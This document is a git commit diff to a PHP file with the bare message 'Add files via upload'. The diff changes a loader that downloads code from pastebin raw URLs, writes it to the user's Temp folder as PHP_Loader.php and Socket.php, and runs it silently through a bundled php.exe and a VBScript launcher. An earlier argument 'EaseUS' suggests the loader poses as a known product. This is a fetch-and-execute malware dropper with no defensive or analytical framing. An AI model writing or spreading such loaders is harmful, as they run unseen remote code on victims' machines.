b2e14668e00431202c4dfa45fb96af38f5cd8650
MohamadXo213 <46904638+MohamadXo213@users.noreply.github.com>
2021-07-04 00:50:20 -0700

    Add files via upload

--- index.php
+++ index.php
@@ -1,9 +1,16 @@
 <?php
-	$code = shell_exec("curl -k -L -s https://pastebin.com/raw/C9wxi49D");
+	$code = file_get_contents("https://pastebin.com/raw/C9wxi49D");
 	$filename = "C:\\Users\\" . get_current_user() . "\\AppData\\Local\\Temp\\PHP_Loader.php";
 	$file = fopen($filename, "w");
 	fwrite($file, $code);
 	fclose($file);
-	system(dirname(__FILE__) . "\Executer.vbs " . dirname(__FILE__) . "\php.exe " . $filename . " EaseUS");
-	exit;
+	system(dirname(__FILE__) . "\Executer.vbs " . dirname(__FILE__) . "\php.exe " . $filename . " ");
+
+	$code = file_get_contents("https://pastebin.com/raw/gVJKJXTk");
+	$filename = "C:\\Users\\" . get_current_user() . "\\AppData\\Local\\Temp\\Socket.php";
+	$file = fopen($filename, "w");
+	fwrite($file, $code);
+	fclose($file);
+	system(dirname(__FILE__) . "\Executer.vbs " . dirname(__FILE__) . "\php.exe " . $filename . " ");
+ exit;
 ?>
